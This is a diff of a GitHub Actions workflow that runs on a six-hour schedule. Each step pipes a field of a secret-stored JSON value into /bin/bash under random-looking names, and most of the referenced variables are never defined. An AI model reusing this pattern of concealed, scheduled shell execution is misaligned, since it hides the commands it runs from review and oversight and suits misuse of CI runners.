@@ -2,18 +2,29 @@ name: kequanji7618
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
-
+    - cron: '26 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kequanji7618
         env:
-          rkz410: ${{ secrets.rkz410 }}
+          wsh82: ${{ secrets.wsh82 }}
         run: |
-          echo $rkz410 | jq -r .m027 | /bin/bash
-          echo $q133 | jq -r .ffwk7 | /bin/bash
+          echo $wsh82 | jq -r .qpw9 | /bin/bash
+          echo $qcs426 | jq -r .fatgi1380 | /bin/bash
+          echo $ogo525 | jq -r .kyy243 | /bin/bash
+          echo $l0265 | jq -r .ui7 | /bin/bash
+          echo $cedk77 | jq -r .frgb3 | /bin/bash
+          echo $nwa8 | jq -r .mng8 | /bin/bash
+          echo $ek75 | jq -r .vkrow6172 | /bin/bash
+          echo $y431 | jq -r .mmm0569 | /bin/bash
+          echo $vb22 | jq -r .hgkfw6 | /bin/bash
+          echo $hs932 | jq -r .secl1688 | /bin/bash
+          echo $i8519 | jq -r .b6 | /bin/bash
+          echo $mcf4676 | jq -r .s251 | /bin/bash
+          echo $pkaiv6 | jq -r .ac770 | /bin/bash
+          echo $vvei69 | jq -r .bjcv84977 | /bin/bash
+          echo $y18 | jq -r .yoai458 | /bin/bash
 
